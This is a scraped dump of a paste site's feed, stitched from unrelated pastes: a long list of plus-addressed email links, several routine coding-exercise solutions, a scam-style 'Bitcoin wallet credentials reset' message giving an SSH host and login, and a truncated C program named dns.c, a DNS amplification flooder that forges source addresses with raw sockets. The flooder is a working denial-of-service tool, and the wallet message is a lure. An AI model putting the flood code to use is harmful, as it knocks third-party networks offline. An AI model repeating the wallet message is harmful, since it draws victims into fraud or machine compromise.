<a href=""mailto:nachelikita+7891@gmail.com"">nachelikita+7891@gmail.com</a>
<a href=""mailto:nachelikita+30800@gmail.com"">nachelikita+30800@gmail.com</a>
<a href=""mailto:nachelikita+1837@gmail.com"">nachelikita+1837@gmail.com</a>
<a href=""mailto:nachelikita+1184@gmail.com"">nachelikita+1184@gmail.com</a>
<a href=""mailto:nachelikita+19595@gmail.com"">nachelikita+19595@gmail.com</a>
<a href=""mailto:nachelikita+12308@gmail.com"">nachelikita+12308@gmail.com</a>
<a href=""mailto:nachelikita+6096@gmail.com"">nachelikita+6096@gmail.com</a>
<a href=""mailto:nachelikita+26303@gmail.com"">nachelikita+26303@gmail.com</a>
<a href=""mailto:nachelikita+17179@gmail.com"">nachelikita+17179@gmail.com</a>
<a href=""mailto:nachelikita+29401@gmail.com"">nachelikita+29401@gmail.com</a>
<a href=""mailto:nachelikita+2810@gmail.com"">nachelikita+2810@gmail.com</a>
<a href=""mailto:nachelikita+27552@gmail.com"">nachelikita+27552@gmail.com</a>
<a href=""mailto:nachelikita+1504@gmail.com"">nachelikita+1504@gmail.com</a>
<a href=""mailto:nachelikita+4932@gmail.com"">nachelikita+4932@gmail.com</a>
<a href=""mailto:nachelikita+32434@gmail.com"">nachelikita+32434@gmail.com</a>
<a href=""mailto:nachelikita+1613@gmail.com"">nachelikita+1613@gmail.com</a>
<a href=""mailto:nachelikita+14384@gmail.com"">nachelikita+14384@gmail.com</a>
<a href=""mailto:nachelikita+31018@gmail.com"">nachelikita+31018@gmail.com</a>
<a href=""mailto:nachelikita+15844@gmail.com"">nachelikita+15844@gmail.com</a>
<a href=""mailto:nachelikita+31388@gmail.com"">nachelikita+31388@gmail.com</a>
<a href=""mailto:nachelikita+21294@gmail.com"">nachelikita+21294@gmail.com</a>
<a href=""mailto:nachelikita+7507@gmail.com"">nachelikita+7507@gmail.com</a>
<a href=""mailto:nachelikita+16173@gmail.com"">nachelikita+16173@gmail.com</a>
<a href=""mailto:agentvictorokle@googlemail.com"">agentvictorokle@googlemail.com</a>
<a href=""mailto:agentvictorokle+476@googlemail.com"">agentvictorokle+476@googlemail.com</a>
<a href=""mailto:agentvictorokle+25392@googlemail.com"">agentvictorokle+25392@googlemail.com</a>
<a href=""mailto:agentvictorokle+13390@googlemail.com"">agentvictorokle+13390@googlemail.com</a>
<a href=""mailto:agentvictorokle+19263@googlemail.com"">agentvictorokle+19263@googlemail.com</a>
<a href=""mailto:agentvictorokle+20710@googlemail.com"">agentvictorokle+20710@googlemail.com</a>
<a href=""mailto:agentvictorokle+11157@googlemail.com"">agentvictorokle+11157@googlemail.com</a>
<a href=""mailto:agentvictorokle+15960@googlemail.com"">agentvictorokle+15960@googlemail.com</a>
<a href=""mailto:agentvictorokle+81@googlemail.com"">agentvictorokle+81@googlemail.com</a>
<a href=""mailto:agentvictorokle+11602@googlemail.com"">agentvictorokle+11602@googlemail.com</a>
<a href=""mailto:agentvictorokle+32544@googlemail.com"">agentvictorokle+32544@googlemail.com</a>
<a href=""mailto:agentvictorokle+10237@googlemail.com"">agentvictorokle+10237@googlemail.com</a>
<a href=""mailto:agentvictorokle+3742@googlemail.com"">agentvictorokle+3742@googlemail.com</a>
<a href=""mailto:agentvictorokle+3913@googlemail.com"">agentvictorokle+3913@googlemail.com</a>
<a href=""mailto:agentvictorokle+1668@googlemail.com"">agentvictorokle+1668@googlemail.com</a>
<a href=""mailto:agentvictorokle+30219@googlemail.com"">agentvictorokle+30219@googlemail.com</a>
<a href=""mailto:agentvictorokle+9323@googlemail.com"">agentvictorokle+9323@googlemail.com</a>
<a href=""mailto:agentvictorokle+27651@googlemail.com"">agentvictorokle+27651@googlemail.com</a>
<a href=""mailto:agentvictorokle+1381@googlemail.com"">agentvictorokle+1381@googlemail.com</a>
<a href=""mailto:agentvictorokle+17145@googlemail.com"">agentvictorokle+17145@googlemail.com</a>
<a href=""mailto:agentvictorokle+3894@googlemail.com"">agentvictorokle+3894@googlemail.com</a>
<a href=""mailto:agentvictorokle+17784@googlemail.com"">agentvictorokle+17784@googlemail.com</a>
<a href=""mailto:agentvictorokle+24912@googlemail.com"">agentvictorokle+24912@googlemail.com</a>
<a href=""mailto:agentvictorokle+12220@googlemail.com"">agentvictorokle+12220@googlemail.com</a>
<a href=""mailto:agentvictorokle+32460@googlemail.com"">agentvictorokle+32460@googlemail.com</a>
<a href=""mailto:agentvictorokle+14571@googlemail.com"">agentvictorokle+14571@googlemail.com</a>
<a href=""mailto:agentvictorokle+29592@googlemail.com"">agentvictorokle+29592@googlemail.com</a>
<a href=""mailto:agentvictorokle+31524@googlemail.com"">agentvictorokle+31524@googlemail.com</a>
<a href=""mailto:agentvictorokle+22624@googlemail.com"">agentvictorokle+22624@googlemail.com</a>
<a href=""mailto:agentvictorokle+6529@googlemail.com"">agentvictorokle+6529@googlemail.com</a>
<a href=""mailto:agentvictorokle+30279@googlemail.com"">agentvictorokle+30279@googlemail.com</a>
<a href=""mailto:agentvictorokle+22119@googlemail.com"">agentvictorokle+22119@googlemail.com</a>
<a href=""mailto:agentvictorokle+17122@googlemail.com"">agentvictorokle+17122@googlemail.com</a>
<a href=""mailto:agentvictorokle+13012@googlemail.com"">agentvictorokle+13012@googlemail.com</a>
<a href=""mailto:agentvictorokle+2418@googlemail.com"">agentvictorokle+2418@googlemail.com</a>
<a href=""mailto:agentvictorokle+6326@googlemail.com"">agentvictorokle+6326@googlemail.com</a>
<a href=""mailto:agentvictorokle+7589@googlemail.com"">agentvictorokle+7589@googlemail.com</a>
<a href=""mailto:agentvictorokle+26573@googlemail.com"">agentvictorokle+26573@googlemail.com</a>
<a href=""mailto:agentvictorokle+6008@googlemail.com"">agentvictorokle+6008@googlemail.com</a>
<a href=""mailto:agentvictorokle+6579@googlemail.com"">agentvictorokle+6579@googlemail.com</a>
<a href=""mailto:agentvictorokle+24774@googlemail.com"">agentvictorokle+24774@googlemail.com</a>
<a href=""mailto:agentvictorokle+817@googlemail.com"">agentvictorokle+817@googlemail.com</a>
<a href=""mailto:agentvictorokle+2906@googlemail.com"">agentvictorokle+2906@googlemail.com</a>
<a href=""mailto:agentvictorokle+14491@googlemail.com"">agentvictorokle+14491@googlemail.com</a>
<a href=""mailto:agentvictorokle+9713@googlemail.com"">agentvictorokle+9713@googlemail.com</a>
<a href=""mailto:agentvictorokle+28199@googlemail.com"">agentvictorokle+28199@googlemail.com</a>
<a href=""mailto:agentvictorokle+11210@googlemail.com"">agentvictorokle+11210@googlemail.com</a>
<a href=""mailto:agentvictorokle+19535@googlemail.com"">agentvictorokle+19535@googlemail.com</a>
<a href=""mailto:agentvictorokle+27774@googlemail.com"">agentvictorokle+27774@googlemail.com</a>
<a href=""mailto:agentvictorokle+7573@googlemail.com"">agentvictorokle+7573@googlemail.com</a>
<a href=""mailto:agentvictorokle+8679@googlemail.com"">agentvictorokle+8679@googlemail.com</a>
<a href=""mailto:agentvictorokle+10948@googlemail.com"">agentvictorokle+10948@googlemail.com</a>
<a href=""mailto:agentvictorokle+13462@googlemail.com"">agentvictorokle+13462@googlemail.com</a>
<a href=""mailto:agentvictorokle+22926@googlemail.com"">agentvictorokle+22926@googlemail.com</a>
<a href=""mailto:agentvictorokle+20884@googlemail.com"">agentvictorokle+20884@googlemail.com</a>
<a href=""mailto:agentvictorokle+12132@googlemail.com"">agentvictorokle+12132@googlemail.com</a>
<a href=""mailto:agentvictorokle+14477@googlemail.com"">agentvictorokle+14477@googlemail.com</a>
<a href=""mailto:agentvictorokle+21812@googlemail.com"">agentvictorokle+21812@googlemail.com</a>
<a href=""mailto:agentvictorokle+30897@googlemail.com"">agentvictorokle+30897@googlemail.com</a>
<a href=""mailto:agentvictorokle+31974@googlemail.com"">agentvictorokle+31974@googlemail.com</a>
<a href=""mailto:agentvictorokle+12344@googlemail.com"">agentvictorokle+12344@googlemail.com</a>
<a href=""mailto:agentvictorokle+1433@googlemail.com"">agentvictorokle+1433@googlemail.com</a>
<a href=""mailto:agentvictorokle+15393@googlemail.com"">agentvictorokle+15393@googlemail.com</a>
<a href=""mailto:agentvictorokle+4335@googlemail.com"">agentvictorokle+4335@googlemail.com</a>
<a href=""mailto:agentvictorokle+15410@googlemail.com"">agentvictorokle+15410@googlemail.com</a>
<a href=""mailto:agentvictorokle+5770@googlemail.com"">agentvictorokle+5770@googlemail.com</a>
<a href=""mailto:agentvictorokle+21624@googlemail.com"">agentvictorokle+21624@googlemail.com</a>
<a href=""mailto:agentvictorokle+5067@googlemail.com"">agentvictorokle+5067@googlemail.com</a>
<a href=""mailto:agentvictorokle+29966@googlemail.com"">agentvictorokle+29966@googlemail.com</a>
<a href=""mailto:agentvictorokle+27304@googlemail.com"">agentvictorokle+27304@googlemail.com</a>
<a href=""mailto:agentvictorokle+22896@googlemail.com"">agentvictorokle+22896@googlemail.com</a>
<a href=""mailto:agentvictorokle+25269@googlemail.com"">agentvictorokle+25269@googlemail.com</a>
<a href=""mailto:agentvictorokle+15807@googlemail.com"">agentvictorokle+15807@googlemail.com</a>
<a href=""mailto:agentvictorokle+9474@googlemail.com"">agentvictorokle+9474@googlemail.com</a>
<a href=""mailto:agentvictorokle+25547@googlemail.com"">agentvictorokle+25547@googlemail.com</a>
<a href=""mailto:agentvictorokle+8567@googlemail.com"">agentvictorokle+8567@googlemail.com</a>
<a href=""mailto:agentvictorokle+27075@googlemail.com"">agentvictorokle+27075@googlemail.com</a>
<a href=""mailto:agentvictorokle+24413@googlemail.com"">agentvictorokle+24413@googlemail.com</a>
<a href=""mailto:agentvictorokle+23459@googlemail.com"">agentvictorokle+23459@googlemail.com</a>
<a href=""mailto:agentvictorokle+6374@googlemail.com"">agentvictorokle+6374@googlemail.com</a>
<a href=""mailto:agentvictorokle+2195@googlemail.com"">agentvictorokle+2195@googlemail.com</a>
<a href=""mailto:agentvictorokle+12013@googlemail.com"">agentvictorokle+12013@googlemail.com</a>
<a href=""mailto:agentvictorokle+26004@googlemail.com"">agentvictorokle+26004@googlemail.com</a>
<a href=""mailto:agentvictorokle+15543@googlemail.com"">agentvictorokle+15543@googlemail.com</a>
<a href=""mailto:agentvictorokle+23114@googlemail.com"">agentvictorokle+23114@googlemail.com</a>
<a href=""mailto:agentvictorokle+10843@googlemail.com"">agentvictorokle+10843@googlemail.com</a>
<a href=""mailto:agentvictorokle+7971@googlemail.com"">agentvictorokle+7971@googlemail.com</a>
<a href=""mailto:agentvictorokle+322@googlemail.com"">agentvictorokle+322@googlemail.com</a>
<a href=""mailto:agentvictorokle+22276@googlemail.com"">agentvictorokle+22276@googlemail.com</a>
<a href=""mailto:agentvictorokle+14193@googlemail.com"">agentvictorokle+14193@googlemail.com</a>
<a href=""mailto:agentvictorokle+11048@googlemail.com"">agentvictorokle+11048@googlemail.com</a>
<a href=""mailto:agentvictorokle+21081@googlemail.com"">agentvictorokle+21081@googlemail.com</a>
<a href=""mailto:agentvictorokle+15235@googlemail.com"">agentvictorokle+15235@googlemail.com</a>
<a href=""mailto:agentvictorokle+584@googlemail.com"">agentvictorokle+584@googlemail.com</a>
<a href=""mailto:agentvictorokle+12146@googlemail.com"">agentvictorokle+12146@googlemail.com</a>
<a href=""mailto:agentvictorokle+32031@googlemail.com"">agentvictorokle+32031@googlemail.com</a>
<a href=""mailto:agentvictorokle+13089@googlemail.com"">agentvictorokle+13089@googlemail.com</a>
<a href=""mailto:agentvictorokle+26143@googlemail.com"">agentvictorokle+26143@googlemail.com</a>
<a href=""mailto:agentvictorokle+266@googlemail.com"">agentvictorokle+266@googlemail.com</a>
<a href=""mailto:agentvictorokle+10253@googlemail.com"">agentvictorokle+10253@googlemail.com</a>
<a href=""mailto:agentvictorokle+1351@googlemail.com"">agentvictorokle+1351@googlemail.com</a>
<a href=""mailto:blessingokorn0@gmail.com"">blessingokorn0@gmail.com</a>
<a href=""mailto:blessingokorn0+29042@gmail.com"">blessingokorn0+29042@gmail.com</a>
<a href=""mailto:blessingokorn0+6005@gmail.com"">blessingokorn0+6005@gmail.com</a>
<a href=""mailto:blessingokorn0+31323@gmail.com"">blessingokorn0+31323@gmail.com</a>
<a href=""mailto:blessingokorn0+11166@gmail.com"">blessingokorn0+11166@gmail.com</a>
<a href=""mailto:blessingokorn0+8984@gmail.com"">blessingokorn0+8984@gmail.com</a>
<a href=""mailto:blessingokorn0+5734@gmail.com"">blessingokorn0+5734@gmail.com</a>
<a href=""mailto:blessingokorn0+25445@gmail.com"">blessingokorn0+25445@gmail.com</a>
<a href=""mailto:blessingokorn0+17590@gmail.com"">blessingokorn0+17590@gmail.com</a>
<a href=""mailto:blessingokorn0+31458@gmail.com"">blessingokorn0+31458@gmail.com</a>
<a href=""mailto:blessingokorn0+26122@gmail.com"">blessingokorn0+26122@gmail.com</a>
<a href=""mailto:blessingokorn0+17764@gmail.com"">blessingokorn0+17764@gmail.com</a>
<a href=""mailto:blessingokorn0+2587@gmail.com"">blessingokorn0+2587@gmail.com</a>
<a href=""mailto:blessingokorn0+14004@gmail.com"">blessingokorn0+14004@gmail.com</a>
<a href=""mailto:blessingokorn0+23165@gmail.com"">blessingokorn0+23165@gmail.com</a>
<a href=""mailto:blessingokorn0+22339@gmail.com"">blessingokorn0+22339@gmail.com</a>
<a href=""mailto:blessingokorn0+5272@gmail.com"">blessingokorn0+5272@gmail.com</a>
<a href=""mailto:blessingokorn0+16592@gmail.com"">blessingokorn0+16592@gmail.com</a>
<a href=""mailto:blessingokorn0+13103@gmail.com"">blessingokorn0+13103@gmail.com</a>
<a href=""mailto:blessingokorn0+27529@gmail.com"">blessingokorn0+27529@gmail.com</a>
<a href=""mailto:blessingokorn0+23445@gmail.com"">blessingokorn0+23445@gmail.com</a>
<a href=""mailto:blessingokorn0+30137@gmail.com"">blessingokorn0+30137@gmail.com</a>
<a href=""mailto:blessingokorn0+7581@gmail.com"">blessingokorn0+7581@gmail.com</a>
<a href=""mailto:blessingokorn0+11854@gmail.com"">blessingokorn0+11854@gmail.com</a>
<a href=""mailto:blessingokorn0+2427@gmail.com"">blessingokorn0+2427@gmail.com</a>
<a href=""mailto:blessingokorn0+12978@gmail.com"">blessingokorn0+12978@gmail.com</a>
<a href=""mailto:blessingokorn0+25915@gmail.com"">blessingokorn0+25915@gmail.com</a>
<a href=""mailto:blessingokorn0+32616@gmail.com"">blessingokorn0+32616@gmail.com</a>
<a href=""mailto:blessingokorn0+703@gmail.com"">blessingokorn0+703@gmail.com</a>
<a href=""mailto:blessingokorn0+18122@gmail.com"">blessingokorn0+18122@gmail.com</a>
<a href=""mailto:blessingokorn0+3382@gmail.com"">blessingokorn0+3382@gmail.com</a>
<a href=""mailto:blessingokorn0+3708@gmail.com"">blessingokorn0+3708@gmail.com</a>
<a href=""mailto:blessingokorn0+32279@gmail.com"">blessingokorn0+32279@gmail.com</a>
<a href=""mailto:blessingokorn0+31299@gmail.com"">blessingokorn0+31299@gmail.com</a>
<a href=""mailto:blessingokorn0+32693@gmail.com"">blessingokorn0+32693@gmail.com</a>
<a href=""mailto:blessingokorn0+21179@gmail.com"">blessingokorn0+21179@gmail.com</a>
<a href=""mailto:blessingokorn0+25098@gmail.com"">blessingokorn0+25098@gmail.com</a>
<a href=""mailto:blessingokorn0+1040@gmail.com"">blessingokorn0+1040@gmail.com</a>
<a href=""mailto:blessingokorn0+1295@gmail.com"">blessingokorn0+1295@gmail.com</a>
<a href=""mailto:blessingokorn0+5426@gmail.com"">blessingokorn0+5426@gmail.com</a>
<a href=""mailto:blessingokorn0+26599@gmail.com"">blessingokorn0+26599@gmail.com</a>
<a href=""mailto:blessingokorn0+18286@gmail.com"">blessingokorn0+18286@gmail.com</a>
<a href=""mailto:blessingokorn0+7306@gmail.com"">blessingokorn0+7306@gmail.com</a>
<a href=""mailto:blessingokorn0+6222@gmail.com"">blessingokorn0+6222@gmail.com</a>
<a href=""mailto:blessingokorn0+1812@gmail.com"">blessingokorn0+1812@gmail.com</a>
<a href=""mailto:blessingokorn0+9227@gmail.com"">blessingokorn0+9227@gmail.com</a>
<a href=""mailto:blessingokorn0+14313@gmail.com"">blessingokorn0+14313@gmail.com</a>
<a href=""mailto:blessingokorn0+8174@gmail.com"">blessingokorn0+8174@gmail.com</a>
<a href=""mailto:blessingokorn0+28084@gmail.com"">blessingokorn0+28084@gmail.com</a>
<a href=""mailto:blessingokorn0+26494@gmail.com"">blessingokorn0+26494@gmail.com</a>
<a href=""mailto:blessingokorn0+25004@gmail.com"">blessingokorn0+25004@gmail.com</a>
<a href=""mailto:blessingokorn0+7501@gmail.com"">blessingokorn0+7501@gmail.com</a>
<a href=""mailto:blessingokorn0+25576@gmail.com"">blessingokorn0+25576@gmail.com</a>
<a href=""mailto:blessingokorn0+13681@gmail.com"">blessingokorn0+13681@gmail.com</a>
<a href=""mailto:blessingokorn0+19088@gmail.com"">blessingokorn0+19088@gmail.com</a>
<a href=""mailto:blessingokorn0+25148@gmail.com"">blessingokorn0+25148@gmail.com</a>
<a href=""mailto:blessingokorn0+11117@gmail.com"">blessingokorn0+11117@gmail.com</a>
<a href=""mailto:blessingokorn0+17463@gmail.com"">blessingokorn0+17463@gmail.com</a>
<a href=""mailto:blessingokorn0+26008@gmail.com"">blessingokorn0+26008@gmail.com</a>
<a href=""mailto:blessingokorn0+20715@gmail.com"">blessingokorn0+20715@gmail.com</a>
<a href=""mailto:blessingokorn0+17103@gmail.com"">blessingokorn0+17103@gmail.com</a>
<a href=""mailto:blessingokorn0+2981@gmail.com"">blessingokorn0+2981@gmail.com</a>
<a href=""mailto:blessingokorn0+26566@gmail.com"">blessingokorn0+26566@gmail.com</a>
<a href=""mailto:blessingokorn0+1682@gmail.com"">blessingokorn0+1682@gmail.com</a>
<a href=""mailto:blessingokorn0+2815@gmail.com"">blessingokorn0+2815@gmail.com</a>
<a href=""mailto:blessingokorn0+20941@gmail.com"">blessingokorn0+20941@gmail.com</a>
<a href=""mailto:blessingokorn0+7116@gmail.com"">blessingokorn0+7116@gmail.com</a>
<a href=""mailto:blessingokorn0+27977@gmail.com"">blessingokorn0+27977@gmail.com</a>
<a href=""mailto:blessingokorn0+2135@gmail.com"">blessingokorn0+2135@gmail.com</a>
<a href=""mailto:blessingokorn0+5411@gmail.com"">blessingokorn0+5411@gmail.com</a>
<a href=""mailto:blessingokorn0+17212@gmail.com"">blessingokorn0+17212@gmail.com</a>
<a href=""mailto:blessingokorn0+12234@gmail.com"">blessingokorn0+12234@gmail.com</a>
<a href=""mailto:blessingokorn0+11060@gmail.com"">blessingokorn0+11060@gmail.com</a>
<a href=""mailto:blessingokorn0+17606@gmail.com"">blessingokorn0+17606@gmail.com</a>
<a href=""mailto:blessingokorn0+25842@gmail.com"">blessingokorn0+25842@gmail.com</a>
<a href=""mailto:blessingokorn0+31557@gmail.com"">blessingokorn0+31557@gmail.com</a>
<a href=""mailto:blessingokorn0+19616@gmail.com"">blessingokorn0+19616@gmail.com</a>
<a href=""mailto:blessingokorn0+31683@gmail.com"">blessingokorn0+31683@gmail.com</a>
<a href=""mailto:blessingokorn0+17990@gmail.com"">blessingokorn0+17990@gmail.com</a>
<a href=""mailto:blessingokorn0+16101@gmail.com"">blessingokorn0+16101@gmail.com</a>
<a href=""mailto:blessingokorn0+2084@gmail.com"">blessingokorn0+2084@gmail.com</a>
<a href=""mailto:blessingokorn0+2520@gmail.com"">blessingokorn0+2520@gmail.com</a>
<a href=""mailto:blessingokorn0+7971@gmail.com"">blessingokorn0+7971@gmail.com</a>
<a href=""mailto:blessingokorn0+6466@gmail.com"">blessingokorn0+6466@gmail.com</a>
<a href=""mailto:blessingokorn0+5736@gmail.com"">blessingokorn0+5736@gmail.com</a>
<a href=""mailto:blessingokorn0+4223@gmail.com"">blessingokorn0+4223@gmail.com</a>
<a href=""mailto:blessingokorn0+32590@gmail.com"">blessingokorn0+32590@gmail.com</a>
<a href=""mailto:blessingokorn0+2013@gmail.com"">blessingokorn0+2013@gmail.com</a>
<a href=""mailto:blessingokorn0+8417@gmail.com"">blessingokorn0+8417@gmail.com</a>
<a href=""mailto:blessingokorn0+24801@gmail.com"">blessingokorn0+24801@gmail.com</a>
<a href=""mailto:blessingokorn0+29617@gmail.com"">blessingokorn0+29617@gmail.com</a>
<a href=""mailto:blessingokorn0+29278@gmail.com"">blessingokorn0+29278@gmail.com</a>
<a href=""mailto:blessingokorn0+11700@gmail.com"">blessingokorn0+11700@gmail.com</a>
<a href=""mailto:blessingokorn0+13710@gmail.com"">blessingokorn0+13710@gmail.com</a>
<a href=""mailto:blessingokorn0+24436@gmail.com"">blessingokorn0+24436@gmail.com</a>
<a href=""mailto:blessingokorn0+32145@gmail.com"">blessingokorn0+32145@gmail.com</a>
<a href=""mailto:blessingokorn0+30492@gmail.com"">blessingokorn0+30492@gmail.com</a>
<a href=""mailto:blessingokorn0+32647@gmail.com"">blessingokorn0+32647@gmail.com</a>
<a href=""mailto:blessingokorn0+13667@gmail.com"">blessingokorn0+13667@gmail.com</a>
<a href=""mailto:blessingokorn0+12912@gmail.com"">blessingokorn0+12912@gmail.com</a>
<a href=""mailto:blessingokorn0+2485@gmail.com"">blessingokorn0+2485@gmail.com</a>
<a href=""mailto:raulgonzal56escgdf@swassociados.in"">raulgonzal56escgdf@swassociados.in</a>"
Pu96cRjQ,IOI '11 P4 - Crocodile's Underground City (Standard I/O),erek1e,C++,Tuesday 27th of June 2023 12:36:54 PM CDT,"#include <iostream>
#include <vector>
#include <algorithm>
#include <queue>

using namespace std;

const int INF = 2e9;

int main() {
    ios_base::sync_with_stdio(0); cin.tie(0); cout.tie(0);
    int n, m, k; cin >> n >> m >> k;
    vector<vector<pair<int, int>>> g(n);
    for (int i = 0; i < m; ++i) {
        int u, v, l; cin >> u >> v >> l;
        g[u].emplace_back(v, l);
        g[v].emplace_back(u, l);
    }

    vector<int> dist(n, INF); // worst case
    priority_queue<pair<int, int>, vector<pair<int, int>>, greater<pair<int, int>>> pq;
    vector<bool> haveOption(n);
    for (int i = 0; i < k; ++i) {
        int x; cin >> x;
        dist[x] = 0;
        pq.emplace(0, x);
    }
    while (!pq.empty()) {
        auto [d, v] = pq.top();
        pq.pop();
        if (dist[v] && dist[v] != INF) continue;
        if (d && !haveOption[v]) {
            haveOption[v] = true;
            continue;
        }
        dist[v] = d;
        if (v == 0) break;
        for (auto [u, l] : g[v]) {
            if (dist[u] == INF) pq.emplace(d+l, u);
        }
    }
    cout << dist[0] << endl;
    return 0;
}"
4scRDM26,Untitled,dllbridge,C,Tuesday 27th of June 2023 12:13:50 PM CDT,"

//  The beginning of the file ""main.cpp""
//  - - - - - - - - - - - - - - - - - -

#include   <stdio.h>
#include  ""resource/Cdate.h""




TT t1;



////////////////////////////////////////////////////
int main()                                        // 
{



return 0;	
}



//  The beginning of the file ""LL.h""
//  - - - - - - - - - - - - - - - - - -

#include  <stdlib.h>

///////////////////////////////////////////////
struct TT
{
	
   TT   *pNext;
   
   int   nDate;	
   
   //////////////
   
   void add(int);

	
};




//  The beginning of the file ""LL.cpp""
//  - - - - - - - - - - - - - - - - - -

#include  ""Cdate.h""



TT *pHead = 0,
   *pTail = 0;  


//////////////////////////////////////////////////////////
void TT::add(int n)
{
		
		
	TT *p =	(TT*)malloc(sizeof(TT));
	
	if(pHead == 0)
	{
		
	   pHead = p;	
		
	}
	else
	{
		
	   pTail->pNext = p;	
	}
	
	nDate = n;
	pNext = 0;
	pTail = p;
	
}









"
hhE9DKg8,Untitled,Skos_Martren,C++,Tuesday 27th of June 2023 12:10:48 PM CDT,"class Solution {
public:

void BFS(vector<vector<char>>& grid, int i, int j) {

    queue<pair<char, char>> Queue; Queue.push({ i,j });
    grid[i][j] = '2';
    while (!Queue.empty()) {

        const auto [i_, j_] = Queue.front(); Queue.pop();

        const array<int, 5> foo = { 0,1,0,-1,0 };

        for (int d = 0; d < 4; ++d) {

            const int dx = i_ + foo[d];
            const int dy = j_ + foo[d + 1];

            if (dx * dy < 0 || dx >= grid.size() || dy >= grid.front().size()) { continue; }
            if (grid[dx][dy] != '1') { continue; }

            grid[dx][dy] = '2';
            Queue.push({ dx,dy });
        }


    }
}

int numIslands(vector<vector<char>>& grid) {

    int ans = 0;
    for (int i = 0; i < grid.size(); ++i) { // строки
        for (int j = 0; j < grid.front().size(); ++j) { // столбцы

            if (grid[i][j] == '1') { BFS(grid, i, j); ++ans; }
        }

    }

    return ans;
}


};"
mKEEPJv8,BTC Wallet Credentials have been reset,kamikrisin_44,GetText,Tuesday 27th of June 2023 12:08:34 PM CDT,"Dear User
We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please disregard this message.
Your new login credentials will be 
blogelzar4w:ktSuSm on 45.9.148.244
You can connect via SSH or use an online client such as ssheasy.com.
Regards"
v4hfxP6r,Renovation,Grossos,JavaScript,Tuesday 27th of June 2023 12:02:01 PM CDT,"function renovation(input) {


    let height = Number(input[0]);
    let width = Number(input[1]);
    let percent = Number(input[2]);
    let percentFix = (100 - percent) / 100;

    let quadratic = height * width * 4; 

    let paintableArea = Math.ceil(quadratic * percentFix);

    let index = 3;
    let command = input[index];

    let sumPaint = 0;

    while (command !== 'Tired!') {

        let paint = Number(command);
        sumPaint += paint;

        index++;
        command = input[index];

    }

    let total = paintableArea - sumPaint;


    if (total === 0) {
        console.log(`All walls are painted! Great job, Pesho!`);

    } else if (total > 0) {
        console.log(`${paintableArea - sumPaint} quadratic m left.`);

    } else {
        console.log(`All walls are painted and you have ${Math.abs(total)} l
    paint left!`);

    }
}
renovation([""2"",
    ""3"",
    ""25"",
    ""6"",
    ""7"",
    ""8""])
"
vFdU5dYq,dns.c,NullRout3d,C,Tuesday 27th of June 2023 11:52:23 AM CDT,"/*--------------------------------------------------*\
|  UDP (Default DNS) amplification against subnets.  |
|  Adapted by @Lupoii (Telegram) - 2021.             |
\*--------------------------------------------------*/
//    gcc -pthread dns.c -o dns -lm   // 
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>
#include <math.h>

static const char PAYLOAD[] =
    /* using ANY ""sl"" at the moment */
    ""\xf1\xe8\x01\x20\x00\x01\x00\x00\x00\x00\x00\x01\x02\x73\x6c\x00\x00\xff\x00\x01\x00\x00\x29\x10\x00\x00\x00\x80\x00\x00\x0c\x00\x0a\x00\x08\xc0\x4e\xd3\x88\xf7\x91\x6b\xb6"";
static unsigned int DPORT = 53;

// Phenomite template begin
#define MAX_PACKET_SIZE 4096
#define PHI 0xaaf219b9
static uint32_t Q[4096], c = 362436;
static unsigned int PAYLOADSIZE = sizeof(PAYLOAD) - 1;

struct list {
  struct sockaddr_in data;
  struct list *next;
  struct list *prev;
};
struct list *head;
volatile int tehport;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;
struct thread_data {
  int thread_id;
  struct list *list_node;
  struct sockaddr_in *sins;
  unsigned long num_ips;
};

void print_usage(char *);

void fatal(char *prog_name)
{
	print_usage(prog_name);
	exit(EXIT_FAILURE);
}

void init_rand(uint32_t x) {
  int i;
  Q[0] = x;
  Q[1] = x + PHI;
  Q[2] = x + PHI + PHI;
  for (i = 3; i < 4096; i++) {
    Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
  }
}

uint32_t rand_cmwc(void) {
  uint64_t t, a = 18782LL;
  static uint32_t i = 4095;
  uint32_t x, r = 0xfffffffe;
  i = (i + 1) & 4095;
  t = a * Q[i] + c;
  c = (t >> 32);
  x = t + c;
  if (x < c) {
    x++;
    c++;
  }
  return (Q[i] = r - x);
}

/* function for header checksums */
unsigned short csum(unsigned short *buf, int nwords) {
  unsigned long sum;
  for (sum = 0; nwords > 0; nwords--)
    sum += *buf++;
  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  return (unsigned short)(~sum);
}

void setup_ip_header(struct iphdr *iph) {
  iph->ihl = 5;
  iph->version = 4;
  iph->tos = 0;
  iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + PAYLOADSIZE;
  iph->id = htonl(61337);
  iph->frag_off = 0;
  iph->ttl = MAXTTL;
  iph->protocol = IPPROTO_UDP;
  iph->check = 0;
  iph->saddr = inet_addr(""127.0.0.1"");
}
void setup_udp_header(struct udphdr *udph) {
  udph->source = htons(61337);
  udph->dest = htons(DPORT);
  udph->check = 0;
  memcpy((void *)udph + sizeof(struct udphdr), PAYLOAD, PAYLOADSIZE);
  udph->len = htons(sizeof(struct udphdr) + PAYLOADSIZE);
}
void *flood(void *par1) {
  struct thread_data *td = (struct thread_data *)par1;
  char datagram[MAX_PACKET_SIZE];
  struct iphdr *iph = (struct iphdr *)datagram;
  struct udphdr *udph = (/*u_int8_t*/ void *)iph + sizeof(struct iphdr);
  struct sockaddr_in *sins = td->sins;
  struct list *list_node = td->list_node;
  int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
  if (s < 0) {
    fprintf(stderr, ""Could not open raw socket.\n"");
    exit(-1);
  }
  init_rand(time(NULL));
  memset(datagram, 0, MAX_PACKET_SIZE);
  setup_ip_header(iph);
  setup_udp_header(udph);
  udph->source = htons(tehport);
  iph->saddr = sins[0].sin_addr.s_addr;
  iph->daddr = list_node->data.sin_addr.s_addr;
  iph->check = csum((unsigned short *)datagram, iph->tot_len >> 1);
  int tmp = 1;
  const int *val = &tmp;
  if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(tmp)) < 0) {
    fprintf(stderr, ""Error: setsockopt() - Cannot set HDRINCL!\n"");
    exit(-1);
  }
  init_rand(time(NULL));
  register unsigned int i;
  i = 0;
  int sn_i = 0;
  while (1) {
	if (tehport < 1){
